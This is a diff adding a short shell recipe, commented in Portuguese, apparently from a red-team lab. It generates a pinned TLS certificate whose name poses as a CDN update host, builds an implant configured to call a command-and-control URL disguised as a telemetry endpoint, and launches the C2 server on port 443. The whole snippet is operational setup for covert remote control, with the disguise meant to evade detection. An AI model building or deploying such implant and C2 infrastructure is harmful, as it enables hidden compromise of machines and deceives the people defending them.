@@ -1,0 +1,13 @@
+# 1. Cert PERSISTENTE (uma vez só — o pin do implante depende dele)
+openssl ecparam -genkey -name prime256v1 -out c2.key
+openssl req -new -x509 -key c2.key -out c2.crt -days 365 \
+    -subj "/CN=cdn-updates.seudominio-lab.local"
+
+# 2. Copiar o cert para o build do implante (para o pinning)
+cp c2.crt implant/c2.crt
+
+# 3. Build com config injetada
+make C2_URL="https://192.168.1.50:443/api/v1/telemetry" SECRET="chave-do-lab-a1b2"
+
+# 4. Rodar
+./c2-server -port 443 -secret "chave-do-lab-a1b2"
